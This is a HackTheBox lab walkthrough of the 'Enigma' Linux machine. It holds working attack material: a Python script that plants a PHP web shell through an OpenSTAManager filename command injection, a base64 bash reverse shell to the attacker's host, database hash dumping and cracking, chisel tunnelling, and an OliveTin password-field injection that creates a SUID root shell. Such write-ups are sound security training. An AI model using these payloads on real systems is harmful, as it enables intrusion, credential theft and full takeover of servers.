
# #HTB 

![[Pasted image 20260821230245.png|281]]


# HackTheBox: Enigma

**Machine IP:** `10.129.10.239` / `10.129.11.38` / `10.129.11.152`  
**Difficulty:** Easy  
**OS:** Linux

---

## Tools Used
- `nmap` - Port discovery
- `ffuf` - Subdomain enumeration
- `showmount` / `mount` - NFS enumeration
- `curl` - HTTP requests
- `python3` - Exploit development
- `john` / `hashcat` - Password cracking
- `netcat` - Reverse shells
- `chisel` - Port forwarding
- `OpenSTAManager` - Web application exploitation (CVE-2025-69212)

---

## Step 1: Reconnaissance - Port Scanning

### Why We Start with Nmap

The first step in any penetration test is reconnaissance. We need to understand what services are running on the target machine, what ports are open, and what versions of software are being used. This information helps us identify potential vulnerabilities.

### Nmap Command Explained
```bash
nmap -n -Pn -sC -sV 10.129.10.239
```

**Flag Breakdown:**
- `-n`: Skip DNS resolution (faster scanning)
- `-Pn`: Treat host as online (skip ping check)
- `-sV`: Version detection - identifies service versions
- `-sC`: Run default scripts - basic vulnerability checks

![[Pasted image 20260821230859.png]]

### Nmap Results Analysis

**Open ports discovered:**
- **Port 22 (SSH)** - OpenSSH 9.6p1 Ubuntu
    - This is the Secure Shell service for remote administration
    - Version 9.6p1 is relatively recent, likely no critical public exploits
- **Port 80 (HTTP)** - nginx 1.24.0 (Ubuntu)
    - Redirects to `http://enigma.htb/`
    - This tells us we need to add the domain to our hosts file
- **Port 110 (POP3)** - Dovecot pop3d
    - Email service - could contain sensitive information
- **Port 143 (IMAP)** - Dovecot imapd (Ubuntu)
    - Email service - could contain sensitive information
- **Port 993 (IMAPS)** - SSL/TLS encrypted IMAP
    - Secure email service
- **Port 995 (POP3S)** - SSL/TLS encrypted POP3
    - Secure email service
- **Port 2049 (NFS)** - nfs_acl 3
    - Network File System - often misconfigured!

**Key Discovery:** The SSL certificate reveals the domain `enigma.htb`. The presence of NFS and email services suggests multiple attack vectors.

### Hosts File Configuration
```bash
echo "10.129.10.239 enigma.htb" | sudo tee -a /etc/hosts
```

**Why This Matters:** The web server uses virtual host configuration. If we access the IP directly, the server won't know which website to serve. By adding `enigma.htb` to our hosts file, we ensure our browser and tools can resolve the domain correctly.



---

## Step 2: Web Enumeration - Subdomain Discovery

### FFUF Subdomain Enumeration

**Why We Use FFUF:** FFUF (Fuzz Faster U Fool) is a powerful web fuzzing tool. We use it to discover subdomains by sending HTTP requests with different subdomain names in the Host header.

```bash
ffuf -u http://FUZZ.enigma.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc 200
```

**How It Works:**
1. `-u http://FUZZ.enigma.htb/` - The FUZZ keyword is replaced with each word from the wordlist
2. `-w` - Specifies the wordlist file
3. `-mc 200` - Only show responses with HTTP 200 status code

**Result:**
```
mail                    [Status: 200, Size: 31133]
www                     [Status: 200, Size: 31133]
```

**Why This Matters:** Subdomains often host different applications or services. The `mail` subdomain likely hosts a webmail interface, which we can now access.

**Add the subdomain to hosts:**
```bash
echo "10.129.10.239 mail.enigma.htb" | sudo tee -a /etc/hosts
```



---

## Step 3: NFS Share Enumeration

### What is NFS?

**NFS** (Network File System) is a protocol that allows users to access files over a network as if they were local files. When misconfigured, it can expose sensitive data to anyone who can reach the server.

### Discovering the NFS Share
```bash
showmount -e 10.129.10.239
```


![[Pasted image 20260820203518.png]]

**Output:**
```bash
Export list for 10.129.10.239:
/srv/nfs/onboarding *
```

**Analysis:**
- `/srv/nfs/onboarding` is the exported directory
- The `*` means ANYONE can mount it (no IP restriction)
- This is a critical misconfiguration!

### Mounting the NFS Share
```bash
mkdir -p /tmp/nfs_share
sudo mount -t nfs 10.129.10.239:/srv/nfs/onboarding /tmp/nfs_share -o nolock
```


![[Pasted image 20260820203612.png]]

**Flag Breakdown:**
- `-t nfs`: NFS filesystem type
- `-o nolock`: Disable file locking (often needed for older NFS versions)    

### Discovering Onboarding Documents
```bash
ls -la /tmp/nfs_share/
```

**Output:**
```bash
-rw-r--r-- 1 root root 1751 Feb 20 01:23 New_Employee_Access.pdf
```


![[Pasted image 20260820203626.png]]

**What We Found:** An onboarding document containing employee credentials!


### Extracting Credentials from PDF

![[Pasted image 20260820203646.png]]

**Why This Matters:** We now have valid email credentials for Kevin Mitchell. This is our entry point to the mail server.




---

## Step 4: Webmail Access - Kevin's Account

### Roundcube Webmail

**Access URL:** `http://mail.enigma.htb`

**Credentials:**
- **Username:** `kevin`
- **Password:** `Enigma2024!`


![[Pasted image 20260820130909.png]]


### Enumerating Roundcube Version


![[Pasted image 20260820130933.png]]


**Found Version:** `Roundcube Webmail 1.6.16`

**Installed Plugins:**

|Plugin|Version|License|
|---|---|---|
|archive|3.5|GPL-3.0+|
|filesystem_attachments|1.0|GPL-3.0+|
|jqueryui|1.13.2|GPL-3.0+|

**Analysis:** Roundcube 1.6.16 is the latest patched version at this time. No public exploits exist for this version. We need to find another way in.



---

## Step 5: Password Reuse - Sarah's Account

### The Password Reuse Hypothesis

**Our Assumption:** The temporary password `Enigma2024!` might have been used for multiple employees.

**Why This Works:** In many organizations, especially with onboarding processes, temporary passwords are often reused or not changed by employees.

**Test the theory:**
```
# Log in as Sarah with the same password
Username: sarah
Password: Enigma2024!
```


![[Pasted image 20260820230212.png]]

**Result:** SUCCESS! We're logged in as Sarah!

### Sarah's Inbox - Finding OpenSTAManager Credentials

**Email Discovered:**
![[Pasted image 20260820230821.png]]

**Critical Discovery:**
- New subdomain: `support_001.enigma.htb`
- Admin credentials: `admin:Ne3s4rtars78s`
- This is likely OpenSTAManager software

**Add the subdomain to hosts:**
```bash
echo "10.129.10.239 support_001.enigma.htb" | sudo tee -a /etc/hosts
```




---

## Step 6: OpenSTAManager - Initial Access

### What is OpenSTAManager?

OpenSTAManager is an open-source management software for technical assistance and electronic invoicing. It's a PHP-based application that runs on Apache/Nginx with MySQL.

### Logging In
- **URL:** `http://support_001.enigma.htb`
- **Credentials:** `admin:Ne3s4rtars78s`


![[Pasted image 20260820230852.png]]

### Version Discovery

![[Pasted image 20260820232144.png]]

**Found Version:** `OpenSTAManager 2.9.8`

**Why This Matters:** Version 2.9.8 is vulnerable to multiple critical vulnerabilities, including:
- CVE-2025-69212: P7M File Command Injection
- Multiple SQL Injection vulnerabilities




---

## Step 7: CVE-2025-69212 - OpenSTAManager RCE

### Understanding the Vulnerability

**CVE-2025-69212** is a critical Remote Code Execution (RCE) vulnerability in OpenSTAManager versions before 2.9.8.

**How It Works:**
1. OpenSTAManager has a feature for importing signed P7M files
2. When verifying a .p7m file, it shells out to OpenSSL
3. The filename is not properly sanitized
4. An attacker can craft a malicious filename with command injection
5. The filename is used in an `exec()` call without proper escaping
6. The server executes the injected commands    

**The Only Requirement:** Valid OpenSTAManager credentials (which we have!)

### Creating the Malicious ZIP File

**Why We Use a ZIP File:** OpenSTAManager expects ZIP archives containing XML/P7M files for import.

**The Exploit Script:**
```python
import zipfile

# Command to deploy a PHP web shell
cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

**Step-by-Step Breakdown:**
1. `invoice.p7m"` - Closes the double quote from the vulnerable code
2. `;{cmd};` - Our command injection payload
3. `echo ".p7m` - Absorbs the remaining arguments as a harmless echo

**The Resulting Filename:**
```
invoice.p7m";cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php;echo ".p7m
```


![[Pasted image 20260820232108.png]]

**What This Does:**
- The `cd files` changes to the files directory
- `echo '<?php system($_GET["c"]); ?>' > SHELL.php` - Creates a PHP web shell
- The web shell accepts a `c` parameter and executes it as a system command


### Uploading the Malicious ZIP

**Navigate to:** `http://support_001.enigma.htb/modules/importazione_fe/import.php`

**Upload:** Select `exploit.zip` and upload

**Response:**
```
Error: Start tag expected, '<' not found
```

**Why This Is Actually Success:** This error means:
1. The file was uploaded successfully
2. The injection executed
3. The XML parser is complaining about DUMMY_P7M_CONTENT (not valid XML)
4. But our `SHELL.php` was already created!


![[Pasted image 20260820232121.png]]


### Verifying the Web Shell
```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
```


![[Pasted image 20260820232202.png]]

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**What This Means:** We have command execution on the server as the `www-data` user!




---

## Step 8: Reverse Shell - www-data

### Setting Up a Reverse Shell

**Listener (Terminal 1):**
```bash
nc -lvnp 4444
```

**Payload (Base64 Encoded):**
```bash
echo -n 'bash -i >& /dev/tcp/10.10.14.163/4444 0>&1' | base64 -w0
```

**Sending the Payload:**
```bash
curl -G "http://support_001.enigma.htb/files/SHELL.php" \
--data-urlencode 'c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjMvNDQ0NCAwPiYx | base64 -d | bash'
```


![[Pasted image 20260820232312.png]]

### Receiving the Shell
```bash
connect to [10.10.14.163] from (UNKNOWN) [10.129.11.38] 42742
bash: cannot set terminal process group (1558): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:/html/openstamanager/files$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


![[Pasted image 20260820232257.png]]





---

## Step 9: Database Credentials Discovery

### Enumerating OpenSTAManager Configuration

**Why We Check Configuration Files:** OpenSTAManager stores database credentials in configuration files.

```bash
cat /var/www/html/openstamanager/config.inc.php
```

**Credentials Found:**
```bash
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds09099';
$db_name = 'openstamanager';
```

**Analysis:**
- Username: `brollin`
- Password: `Fri3nds09099`
- Database: `openstamanager`

**Note:** The password appears slightly different from what was found in some writeups. This could be a variation or our specific instance.


![[Pasted image 20260820232406.png]]


### Accessing the Database
```bash
mysql -u brollin -p'Fri3nds09099' openstamanager -e "SELECT username, password FROM zz_users;"
```

**Result:**
```bash
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu |
| haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC |
+----------+--------------------------------------------------------------+
```


![[Pasted image 20260820232524.png]]

**What We Found:**
- `admin` password hash (bcrypt)    
- `haris` password hash (bcrypt) - This is likely a system user!




---

## Step 10: Cracking the Password Hash

### Why We Use John/Hashcat

The password hashes are bcrypt format (`$2y$10$`). This is a strong hashing algorithm, but with a good wordlist like `rockyou.txt`, we can crack common passwords.

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris_hash.txt
john --format=bcrypt haris_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:**
```bash
bestfriends    (?)
```

![[Pasted image 20260820232724.png]]
- **Password:** `bestfriends`




---

## Step 11: Privilege Pivot - haris User

### Switching Users
```bash
www-data@enigma:~/html/openstamanager/files$ su haris
Password: bestfriends

haris@enigma:/var/www/html/openstamanager/files$ whoami
haris
haris@enigma:/var/www/html/openstamanager/files$ id
uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
```

**What Changed:**
- `haris` is a real system user with a home directory
- `haris` belongs to the `users` group
- We can now access home directories

### Capturing the User Flag
```bash
haris@enigma:/home$ cd haris
haris@enigma:~$ cat user.txt
40ed9898172b070c4e9c63d721b2f730
```


![[Pasted image 20260820233904.png]]

**User Flag:** `40ed9898172b070c4e9c63d721b2f730`




---

## Step 12: Privilege Escalation - Root

### Discovering OliveTin

**Why We Look for Root Processes:** To escalate privileges, we need to find processes running as root that we can interact with.
```bash
haris@enigma:~$ ps aux | grep root | grep -v "grep"
```

**Key Discovery:**
```bash
root        1440       1  0 17:41 ?        00:00:00 /usr/local/bin/OliveTin
```

**What is OliveTin?** OliveTin is an open-source automation tool that provides a web interface for running shell commands. It runs as root!

### Analyzing OliveTin Configuration
```bash
haris@enigma:~$ cat /etc/OliveTin/config.yaml
```

**Critical Configuration:**
```yaml
# This setting effectively enables or disables guests.
# If set to "true", then users will have to login to do anything.
authRequireGuestsToLogin: false

# Actions defined in the configuration
actions:
  - title: Backup Database
    id: backup_database
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
        default: production
```

**Why This is Dangerous:**
1. `authRequireGuestsToLogin: false` - Anyone can access the API!
2. The `Backup Database` action uses `{{ db_pass }}` in a shell command
3. This allows command injection through the `db_pass` parameter
4. OliveTin runs as root, so commands execute with root privileges

### The Command Injection Vector

**Understanding the Vulnerability:**
```bash
mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
```

If we set `db_pass` to:
```text
x' ; install -m 4755 /bin/bash /tmp/.bs ; #
```

The executed command becomes:
```bash
mysqldump -u backup_svc -p'x' ; install -m 4755 /bin/bash /tmp/.bs ; #' production > /opt/backups/backup.sql
```

**Breakdown:**
1. `x'` - Closes the single quote
2. `;` - Ends the current command
3. `install -m 4755 /bin/bash /tmp/.bs` - Installs a SUID bash binary
4. `;` - Command separator
5. `#` - Comments out the rest of the command

### The Problem: OliveTin API Access

**Issue:** SSH password authentication is disabled. We can't directly access OliveTin's API from our Kali machine.

**Solution:** Use Chisel for port forwarding!

### Chisel Port Forwarding Setup

**Why Chisel?** Chisel is a TCP tunnel over HTTP, perfect for environments where direct SSH is blocked.

**Step 1: Download Chisel on Kali**
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel
```

![[Pasted image 20260821222959.png]]


**Step 2: Start Chisel Server (Kali)**
```bash
./chisel server -p 8000 --reverse
```

![[Pasted image 20260821222930.png]]


**Step 3: Start HTTP Server to Transfer Chisel**
```bash
python3 -m http.server 80
```

![[Pasted image 20260821222940.png]]


**Step 4: Download Chisel on Target**
```bash
haris@enigma:/tmp$ wget http://10.10.14.163/chisel
haris@enigma:/tmp$ chmod +x chisel
```

**Step 5: Connect Chisel Client (Target)**
```bash
haris@enigma:/tmp$ ./chisel client 10.10.14.163:8000 R:1337:127.0.0.1:1337
```

![[Pasted image 20260821223019.png]]

**What This Does:**
- Tunnels OliveTin (port 1337) from the target to our Kali machine
- We can now access `http://127.0.0.1:1337` in our browser!    

### Accessing OliveTin Dashboard

**Open in browser:** `http://127.0.0.1:1337`

**What We See:**
- OliveTin dashboard with various actions
- "Backup Database" action is available


![[Pasted image 20260821223043.png]]


### Executing the Command Injection

**Fill in the fields:**
- **db_user:** `backup_svc`
- **db_pass:** `x' ; install -m 4755 /bin/bash /tmp/.bs ; #`
- **db_name:** `production`

**Click "Start"**


![[Pasted image 20260821223111.png]]



**Result:**
```
mysqldump: [Warning] Using a password on the command line interface can be insecure.
Usage: mysqldump [OPTIONS] database [tables]
OR     mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]
...
```

- **This is an error from mysqldump, but our command injection was successful!**

![[Pasted image 20260821223126.png]]


### Getting Root Shell

```bash
haris@enigma:/tmp$ /tmp/.bs -p
/bs-5.2.4# whoami
root
```

![[Pasted image 20260821223156.png]]
-  **We are root!**

### Capturing the Root Flag
```bash
root@enigma:~# cat /root/root.txt
6216c952b0fdd68c7268be5a81a565c1
```

![[Pasted image 20260821223205.png]]




---

## Step 13: Machine Owned


